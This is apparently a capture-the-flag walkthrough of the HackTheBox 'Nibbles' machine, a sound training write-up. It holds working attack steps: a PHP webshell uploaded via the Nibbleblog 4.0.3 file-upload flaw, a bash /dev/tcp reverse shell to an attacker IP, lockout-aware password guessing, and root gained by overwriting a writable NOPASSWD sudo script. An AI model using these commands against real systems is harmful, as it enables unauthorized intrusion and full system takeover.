Nibbles

Medium linux nibbleblog file-upload sudo

A clean two-stage Linux box. A forgotten Nibbleblog CMS is hiding inside an HTML comment on the landing page; its 4.0.3 release carried an authenticated arbitrary file-upload vulnerability (CVE-2015-6967) that lets us drop a PHP shell as the web user. From there, a sudo NOPASSWD entry pointing at a world-writable script in the user's home folder makes the privilege escalation almost comedic.

01 Reconnaissance

nmap -sC -sV -p- -T4 10.10.10.75 -oN nmap.txt
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).

Only two ports. SSH is version-current enough to not bother, so the whole box will come through the web service.

02 Finding Nibbleblog

The landing page is effectively empty — just "Hello world!". The trick is to look at the source:

curl -s http://10.10.10.75/ | head
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->

That comment is the whole clue. Browse to /nibbleblog/ and we find a fully rendered CMS. Fuzz its directory tree to identify the admin panel:

gobuster dir -u http://10.10.10.75/nibbleblog/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt -t 40
/admin                (Status: 301)
/admin.php            (Status: 200)
/content              (Status: 301)
/themes               (Status: 301)
/plugins              (Status: 301)
/README               (Status: 200)

Two files are worth reading right away:

curl http://10.10.10.75/nibbleblog/README
curl http://10.10.10.75/nibbleblog/content/private/users.xml

README confirms the version — Nibbleblog 4.0.3. The users.xml path reveals the admin username is admin. CVE-2015-6967 applies directly to this version: an authenticated admin can upload arbitrary files through the "My Image" plugin.

03 Getting admin credentials

We need a working login before the file-upload vuln is reachable. There's no registration form, so the only option is brute force — but carefully, because Nibbleblog locks the admin account for five minutes after five bad attempts.

Try the obvious first:

curl -i -s -X POST http://10.10.10.75/nibbleblog/admin.php \
  -d "username=admin&password=nibbles" -c cookies.txt

Machine name as password — it works. admin:nibbles is the intended credential. If it didn't, targeted guessing (admin, nibbleblog, nibbler) would have hit within a couple of tries.

Careful: do not run hydra with rockyou.txt here. The account-lockout mechanism will trigger within seconds, and you'll waste the next five minutes staring at "blacklist" errors. Short, targeted lists only.

04 File-upload RCE

Log in at /nibbleblog/admin.php with admin:nibbles, then navigate to Plugins → My image → Configure. The upload form accepts PHP because Nibbleblog 4.0.3 doesn't validate the extension server-side.

Prepare a minimal webshell (pentestmonkey's PHP reverse shell is the classic, but a one-liner is plenty):

cat > shell.php <<'EOF'
<?php system($_GET['c']); ?>
EOF

Upload shell.php through the plugin form, then visit the plugin's image directory to trigger it:

curl "http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?c=id"
Note: the file on disk is renamed to image.php by the plugin regardless of the uploaded filename. Don't waste time browsing for shell.php; it's always at the path above.

For a real shell, catch a reverse connection:

# attacker
nc -lvnp 4444

# trigger
curl "http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?c=bash+-c+'bash+-i+%3E%26+/dev/tcp/10.10.X.X/4444+0%3E%261'"

Shell lands as the nibbler user.

05 Stable foothold as nibbler

First: stabilize the shell.

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter, Enter

Grab the user flag:

cat /home/nibbler/user.txt

There's also a personal.zip in the home folder. Unzip it in place:

cd /home/nibbler
unzip personal.zip

Inside is a personal/stuff/ directory with a script called monitor.sh. That filename — plus the fact someone bothered to zip it up — is the privesc hint.

06 Privilege escalation — writable sudo script

Check what nibbler can run as root:

sudo -l
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

The NOPASSWD on a script living in the user's own home folder is the whole vulnerability. We don't even need to exploit the script's logic — we simply overwrite it:

ls -la /home/nibbler/personal/stuff/monitor.sh
-rwxrwxrwx 1 nibbler nibbler 4015 ...  monitor.sh

World-writable. Replace the file with a one-line payload:

echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo '/bin/bash' >> /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
root@Nibbles:~# id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt

07 Takeaways

  • Always view the source of empty-looking pages. The "Hello world!" page hides the entire foothold in a single HTML comment. This pattern repeats constantly on HTB and in the real world.
  • Read README, CHANGELOG, version.txt. Free version fingerprinting; no guessing required.
  • sudo -l is always step one post-foothold. A surprising number of boxes — and real environments — have NOPASSWD entries pointing at user-writable scripts. It's the single cheapest check in the privesc toolbox.
  • Lockout-aware brute force. Lists of 5–20 targeted guesses beat rockyou.txt against any application with rate-limiting. Context (the box name, the app name, the admin's habits) usually gets you in.
